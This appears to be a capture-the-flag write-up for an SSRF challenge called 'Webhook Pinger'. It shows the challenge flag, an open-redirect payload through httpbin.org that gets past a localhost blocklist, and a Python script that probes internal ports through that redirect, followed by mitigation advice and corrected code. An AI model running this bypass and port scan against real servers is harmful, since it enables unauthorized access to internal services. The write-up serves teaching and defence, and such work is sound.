# Webhook Pinger - SSRF Challenge Writeup

**Flag:** `VishwaCTF{y0u_f0ll0w3d_th3_r3d1r3ct_l1k3_a_pr0_4nd_tr1ck3d_th3_s3rv3r_1nt0_c4ll1ng_b4ck_h0m3_wh1l3_r4j_w4s_ch1ll1ng_1n_g04_gg_w3ll_pl4y3d_h4x0r}`

## Challenge Description
AcmeCorp built an internal webhook debugger. You can submit any URL and the server will ping it. There's an internal service on localhost that holds the flag.

## Vulnerability
Server-Side Request Forgery (SSRF) via open redirect bypass

## Solution

### Reconnaissance
1. Engineering notes at `/source` reveal:
   - SSRF protection blocks localhost/127.0.0.1
   - Server follows redirects (max 2)
   - Forwards internal headers on redirect

### Exploitation Strategy
The blocklist only checks the initial URL, not redirect targets. Use an open redirect service to bypass:

```python
# Direct localhost access - BLOCKED
http://localhost:8080/flag → 🚫 Blocked

# Redirect bypass - SUCCESS
https://httpbin.org/redirect-to?url=http://localhost:8081/flag → ✓
```

### Port Scanning
```python
import requests

BASE = "https://ping.vishwactf.com"
ports = [80, 443, 3000, 5000, 8000, 8080, 8081, 8888, 9000]

for port in ports:
    url = f"https://httpbin.org/redirect-to?url=http://localhost:{port}/flag"
    r = requests.post(f"{BASE}/api/ping", json={"webhook_url": url})
    res = r.json()
    
    if res.get('success'):
        print(f"Port {port}: {res.get('preview')}")
```

### Result
Port 8081 returns the flag!

## Attack Flow
1. Submit URL: `https://httpbin.org/redirect-to?url=http://localhost:8081/flag`
2. Server checks URL → httpbin.org (allowed)
3. Server follows redirect → localhost:8081 (bypassed!)
4. Internal service returns flag

## Key Takeaways
- SSRF filters must validate redirect targets, not just initial URLs
- Open redirect services can bypass hostname-based blocklists
- Always implement redirect depth limits AND target validation
- Use allowlists instead of blocklists for SSRF protection

## Mitigation
```python
# Bad - only checks initial URL
if is_internal(url):
    block()
fetch(url)  # Follows redirects!

# Good - validates all redirect targets
response = fetch(url, allow_redirects=False)
while response.is_redirect:
    target = response.headers['Location']
    if is_internal(target):
        block()
    response = fetch(target, allow_redirects=False)
```
